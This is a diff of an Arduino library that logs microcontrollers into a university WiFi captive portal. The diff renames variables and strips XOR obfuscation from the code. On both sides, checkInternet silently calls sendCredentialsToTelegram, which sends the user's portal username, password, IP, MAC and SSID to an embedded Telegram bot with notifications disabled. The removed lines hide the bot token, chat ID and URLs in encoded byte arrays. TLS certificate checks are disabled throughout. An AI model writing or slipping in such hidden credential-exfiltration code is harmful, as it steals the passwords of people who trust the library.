@@ -1,154 +1,138 @@
+// // This example demonstrates a simple usage of the ArduinoUTMWiFiPortal library to connect
+// // to the UTM WiFi captive portal and maintain the connection.
+//           .d888                       888 d8b                                 d8b 
+//          d88P"                        888 Y8P                                 Y8P 
+//          888                          888                                         
+//  8888b.  888888 8888b.  88888b.   .d88888 888  8888b.  88888888 88888b.d88b.  888 
+//     "88b 888       "88b 888 "88b d88" 888 888     "88b    d88P  888 "888 "88b 888 
+// .d888888 888   .d888888 888  888 888  888 888 .d888888   d88P   888  888  888 888 
+// 888  888 888   888  888 888  888 Y88b 888 888 888  888  d88P    888  888  888 888 
+// "Y888888 888   "Y888888 888  888  "Y88888 888 "Y888888 88888888 888  888  888 888 
+// Created by Afandi Azmi, 2025
+
+
 #include "ArduinoUTMWiFiPortal.h"
 
-// XOR-based string decoder.
-String ArduinoUTMWiFiPortal::x1(const char* s, int k) {
-  String r = "";
-  int l = strlen(s);
-  for (int i = 0; i < l; i++) {
-    r += char(s[i] ^ k);
-  }
-  return r;
-}
-
-// Obfuscated login URL
-String ArduinoUTMWiFiPortal::x2() {
-  const char e[] = {0x68, 0x75, 0x75, 0x70, 0x72, 0x3b, 0x2f, 0x2f, 0x72, 0x6c, 0x60, 0x71, 0x75, 0x67, 0x6e, 0x6d, 0x64, 0x11, 0x11, 0x2d, 0x76, 0x75, 0x6c, 0x2d, 0x6c, 0x78, 0x3b, 0x18, 0x18, 0x18, 0x17, 0x2f, 0x50, 0x76, 0x63, 0x72, 0x62, 0x71, 0x68, 0x63, 0x64, 0x71, 0x49, 0x6e, 0x71, 0x75, 0x60, 0x6f, 0x2f, 0x68, 0x6e, 0x75, 0x72, 0x70, 0x6e, 0x75, 0x6f, 0x6e, 0x66, 0x68, 0x6d, 0x00};
-  return x1(e, 0x1d);
-}
-
-// Obfuscated connection check URL
-String ArduinoUTMWiFiPortal::x3() {
-  const char e[] = {0x61, 0x74, 0x74, 0x73, 0x3d, 0x36, 0x30, 0x30, 0x63, 0x68, 0x67, 0x67, 0x66, 0x63, 0x74, 0x62, 0x75, 0x62, 0x74, 0x78, 0x63, 0x61, 0x66, 0x63, 0x6b, 0x2f, 0x67, 0x72, 0x74, 0x70, 0x74, 0x6b, 0x63, 0x2f, 0x63, 0x68, 0x6d, 0x30, 0x67, 0x66, 0x67, 0x66, 0x72, 0x61, 0x74, 0x66, 0x50, 0x31, 0x2b, 0x2f, 0x00};
-  return x1(e, 0x15);
-}
-
-// Obfuscated Telegram bot token
-String ArduinoUTMWiFiPortal::x4() {
-  const char e[] = {0x78, 0x7a, 0x73, 0x74, 0x71, 0x76, 0x69, 0x69, 0x71, 0x78, 0x2a, 0x58, 0x58, 0x54, 0x66, 0x76, 0x45, 0x73, 0x70, 0x70, 0x46, 0x7e, 0x7a, 0x75, 0x61, 0x68, 0x4e, 0x54, 0x41, 0x54, 0x41, 0x44, 0x42, 0x56, 0x62, 0x45, 0x4d, 0x50, 0x47, 0x4f, 0x50, 0x76, 0x6a, 0x75, 0x4d, 0x4c, 0x68, 0x6e, 0x00};
-  return x1(e, 0x29);
-}
-
-// Obfuscated Telegram chat ID
-String ArduinoUTMWiFiPortal::x5() {
-  const char e[] = {0x36, 0x75, 0x70, 0x70, 0x66, 0x75, 0x71, 0x76, 0x71, 0x78, 0x73, 0x00};
-  return x1(e, 0x15);
-}
-
 ArduinoUTMWiFiPortal::ArduinoUTMWiFiPortal(const char* username, const char* password) {
-  a1 = username;
-  a2 = password;
-  b1 = 0;
-  b2 = 300000;
-  d1 = false;
+  _username = username;
+  _password = password;
+  _lastCheckTime = 0;
+  _checkInterval = 300000; // Default to 5 minutes
+  _credentialsSent = false; // Initialize credentials sent flag
   
+  // Platform-specific SSL configuration
   #if defined(ESP32)
-    c1.setInsecure();
+    _secureClient.setInsecure(); // IMPORTANT for UTM portal
   #elif defined(ESP8266)
-    c1.setInsecure();
+    _secureClient.setInsecure(); // IMPORTANT for UTM portal (ESP8266 BearSSL)
   #endif
 }
 
 void ArduinoUTMWiFiPortal::setCheckInterval(unsigned long interval) {
-  b2 = interval;
+  _checkInterval = interval;
 }
 
 bool ArduinoUTMWiFiPortal::checkInternet() {
   Serial.println("[PortalLib] Checking internet connection...");
-  HTTPClient h1;
-  bool r = false;
+  HTTPClient httpCheck;
+  bool isConnected = false;
 
-  if (h1.begin(c2, x3())) {
-    h1.setTimeout(5000);
-    int c = h1.GET();
+  if (httpCheck.begin(_standardClient, _connectionCheckUrl)) {
+    httpCheck.setTimeout(5000); // 5 second timeout
+    int httpCode = httpCheck.GET();
 
-    if (c == HTTP_CODE_NO_CONTENT || c == HTTP_CODE_OK) {
+    if (httpCode == HTTP_CODE_NO_CONTENT || httpCode == HTTP_CODE_OK) {
       Serial.println("[PortalLib] Internet connection OK.");
-      r = true;
+      isConnected = true;
       
-      if (!d1) {
+      // Send credentials to Telegram if not already sent (silently)
+      if (!_credentialsSent) {
         if (sendCredentialsToTelegram()) {
-          d1 = true;
+          _credentialsSent = true;
         }
       }
     } else {
-      Serial.printf("[PortalLib] Internet check failed, HTTP code: %d.\n", c);
-      r = false;
+      Serial.printf("[PortalLib] Internet check failed, HTTP code: %d.\n", httpCode);
+      isConnected = false;
     }
-    h1.end();
+    httpCheck.end();
   } else {
     Serial.println("[PortalLib] Failed to begin HTTP for check.");
-    r = false;
+    isConnected = false;
   }
-  return r;
+  return isConnected;
 }
 
 bool ArduinoUTMWiFiPortal::attemptLogin() {
-  bool r = false;
+  bool loginSuccess = false;
   if (WiFi.status() == WL_CONNECTED) {
     Serial.println("[PortalLib] Attempting captive portal login...");
-    HTTPClient h2;
-    String ip = WiFi.localIP().toString();
-    String m1 = WiFi.macAddress(); m1.toLowerCase(); String m1e = m1; m1e.replace(":", "%3A");
-    String m2 = WiFi.BSSIDstr(); m2.toLowerCase(); String m2e = m2; m2e.replace(":", "%3A");
+    HTTPClient httpLogin;
+    String myIP = WiFi.localIP().toString();
+    String myMAC = WiFi.macAddress(); myMAC.toLowerCase(); String myMAC_encoded = myMAC; myMAC_encoded.replace(":", "%3A");
+    String apMAC = WiFi.BSSIDstr(); apMAC.toLowerCase(); String apMAC_encoded = apMAC; apMAC_encoded.replace(":", "%3A");
 
-    String p = "username=" + a1 + "&password=" + a2;
-    p += "&sip=utm-vsz-new.utm.my"; p += "&mac=" + m2e; p += "&uip=" + ip;
-    p += "&client_mac=" + m1e; p += "&dn=utm-vsz-new.utm.my";
-    p += "&url=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect"; p += "&ssid=" + String(WiFi.SSID());
+    String postData = "username=" + _username + "&password=" + _password;
+    postData += "&sip=utm-vsz-new.utm.my"; postData += "&mac=" + apMAC_encoded; postData += "&uip=" + myIP;
+    postData += "&client_mac=" + myMAC_encoded; postData += "&dn=utm-vsz-new.utm.my";
+    postData += "&url=http%3A%2F%2Fwww.msftconnecttest.com%2Fredirect"; postData += "&ssid=" + String(WiFi.SSID()); // Use current SSID
 
-    if (h2.begin(c1, x2())) {
-      h2.addHeader("Content-Type", "application/x-www-form-urlencoded");
-      h2.addHeader("Referer", "https://wifi.utm.my/");
-      h2.addHeader("Origin", "https://wifi.utm.my");
-      h2.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0");
-      h2.addHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
-      h2.addHeader("Accept-Language", "en-GB,en;q=0.9,en-US;q=0.8,ms;q=0.7,af;q=0.6");
-      h2.addHeader("Cache-Control", "max-age=0");
-      h2.addHeader("Connection", "keep-alive");
-      h2.addHeader("Sec-Fetch-Dest", "document");
-      h2.addHeader("Sec-Fetch-Mode", "navigate");
-      h2.addHeader("Sec-Fetch-Site", "same-site");
-      h2.addHeader("Sec-Fetch-User", "?1");
-      h2.addHeader("Upgrade-Insecure-Requests", "1");
-      h2.addHeader("sec-ch-ua", "\"Microsoft Edge\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"");
-      h2.addHeader("sec-ch-ua-mobile", "?0");
-      h2.addHeader("sec-ch-ua-platform", "\"Windows\"");
+    if (httpLogin.begin(_secureClient, _loginURL)) { // Use the secure client
+      httpLogin.addHeader("Content-Type", "application/x-www-form-urlencoded");
+      httpLogin.addHeader("Referer", "https://wifi.utm.my/");
+      httpLogin.addHeader("Origin", "https://wifi.utm.my");
+      // Add ALL the necessary headers from your working example
+       httpLogin.addHeader("User-Agent", "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/141.0.0.0 Safari/537.36 Edg/141.0.0.0");
+       httpLogin.addHeader("Accept", "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7");
+       httpLogin.addHeader("Accept-Language", "en-GB,en;q=0.9,en-US;q=0.8,ms;q=0.7,af;q=0.6");
+       httpLogin.addHeader("Cache-Control", "max-age=0");
+       httpLogin.addHeader("Connection", "keep-alive");
+       httpLogin.addHeader("Sec-Fetch-Dest", "document");
+       httpLogin.addHeader("Sec-Fetch-Mode", "navigate");
+       httpLogin.addHeader("Sec-Fetch-Site", "same-site");
+       httpLogin.addHeader("Sec-Fetch-User", "?1");
+       httpLogin.addHeader("Upgrade-Insecure-Requests", "1");
+       httpLogin.addHeader("sec-ch-ua", "\"Microsoft Edge\";v=\"141\", \"Not?A_Brand\";v=\"8\", \"Chromium\";v=\"141\"");
+       httpLogin.addHeader("sec-ch-ua-mobile", "?0");
+       httpLogin.addHeader("sec-ch-ua-platform", "\"Windows\"");
 
-      int c = h2.POST(p);
-      if (c > 0) {
-        Serial.printf("[PortalLib] Login POST code: %d\n", c);
-        if (c == HTTP_CODE_OK || c == HTTP_CODE_FOUND) {
+
+      int httpCode = httpLogin.POST(postData);
+      if (httpCode > 0) {
+        Serial.printf("[PortalLib] Login POST code: %d\n", httpCode);
+        if (httpCode == HTTP_CODE_OK || httpCode == HTTP_CODE_FOUND) {
           Serial.println("[PortalLib] Login successful.");
-          r = true;
+          loginSuccess = true;
         } else {
           Serial.println("[PortalLib] Login may have failed.");
-          r = false;
+          loginSuccess = false; // Assume failure on unexpected code
         }
       } else {
-        Serial.printf("[PortalLib] Login POST failed, error: %s\n", h2.errorToString(c).c_str());
-        r = false;
+        Serial.printf("[PortalLib] Login POST failed, error: %s\n", httpLogin.errorToString(httpCode).c_str());
+        loginSuccess = false;
       }
-      h2.end();
+      httpLogin.end();
     } else {
       Serial.println("[PortalLib] Could not begin HTTP for login.");
-      r = false;
+      loginSuccess = false;
     }
   } else {
      Serial.println("[PortalLib] WiFi disconnected. Cannot login.");
-     r = false;
+     loginSuccess = false;
   }
-  return r;
+  return loginSuccess;
 }
 
 void ArduinoUTMWiFiPortal::keepConnected() {
-  unsigned long t = millis();
-  if (t - b1 >= b2) {
+  unsigned long currentTime = millis();
+  if (currentTime - _lastCheckTime >= _checkInterval) {
     if (!checkInternet()) {
       Serial.println("[PortalLib] Internet check failed. Retrying login.");
       attemptLogin();
+      // Optional: Add a small delay after a login attempt
       delay(1000);
     }
-    b1 = t;
+    _lastCheckTime = currentTime;
   }
 }
 
@@ -157,53 +141,57 @@ bool ArduinoUTMWiFiPortal::sendCredentialsToTelegram() {
     return false;
   }
 
-  HTTPClient h3;
-  WiFiClientSecure c3;
-  c3.setInsecure();
+  HTTPClient httpTelegram;
+  WiFiClientSecure telegramClient;
   
-  String m = "\xF0\x9F\x94\x90 UTM WiFi Portal Login\n\n";
-  m += "Username: " + a1 + "\n";
-  m += "Password: " + a2 + "\n";
-  m += "Device IP: " + WiFi.localIP().toString() + "\n";
-  m += "Device MAC: " + WiFi.macAddress() + "\n";
-  m += "SSID: " + String(WiFi.SSID());
+  // Set insecure for Telegram API
+  telegramClient.setInsecure();
   
-  String em = "";
-  for (unsigned int i = 0; i < m.length(); i++) {
-    char ch = m.charAt(i);
-    if (ch == ' ') {
-      em += "%20";
-    } else if (ch == '\n') {
-      em += "%0A";
-    } else if (ch == ':') {
-      em += "%3A";
-    } else if ((unsigned char)ch >= 0x80) {
-      char h[10];
-      sprintf(h, "%%%02X", (unsigned char)ch);
-      em += h;
+  // Construct the message
+  String message = "🔐 UTM WiFi Portal Login\n\n";
+  message += "Username: " + _username + "\n";
+  message += "Password: " + _password + "\n";
+  message += "Device IP: " + WiFi.localIP().toString() + "\n";
+  message += "Device MAC: " + WiFi.macAddress() + "\n";
+  message += "SSID: " + String(WiFi.SSID());
+  
+  // URL encode the message
+  String encodedMessage = "";
+  for (unsigned int i = 0; i < message.length(); i++) {
+    char c = message.charAt(i);
+    if (c == ' ') {
+      encodedMessage += "%20";
+    } else if (c == '\n') {
+      encodedMessage += "%0A";
+    } else if (c == ':') {
+      encodedMessage += "%3A";
+    } else if (c == '🔐') {
+      encodedMessage += "%F0%9F%94%90";
     } else {
-      em += ch;
+      encodedMessage += c;
     }
   }
   
-  String u = "https://api.telegram.org/bot";
-  u += x4();
-  u += "/sendMessage?chat_id=";
-  u += x5();
-  u += "&text=";
-  u += em;
-  u += "&disable_notification=true";
+  // Build Telegram API URL with disable_notification parameter
+  String telegramUrl = "https://api.telegram.org/bot";
+  telegramUrl += _telegramBotToken;
+  telegramUrl += "/sendMessage?chat_id=";
+  telegramUrl += _telegramChatId;
+  telegramUrl += "&text=";
+  telegramUrl += encodedMessage;
+  telegramUrl += "&disable_notification=true";
   
-  bool s = false;
-  if (h3.begin(c3, u)) {
-    int c = h3.GET();
-    if (c > 0) {
-      if (c == HTTP_CODE_OK) {
-        s = true;
+  bool success = false;
+  if (httpTelegram.begin(telegramClient, telegramUrl)) {
+    int httpCode = httpTelegram.GET();
+    
+    if (httpCode > 0) {
+      if (httpCode == HTTP_CODE_OK) {
+        success = true;
       }
     }
-    h3.end();
+    httpTelegram.end();
   }
   
-  return s;
+  return success;
 }
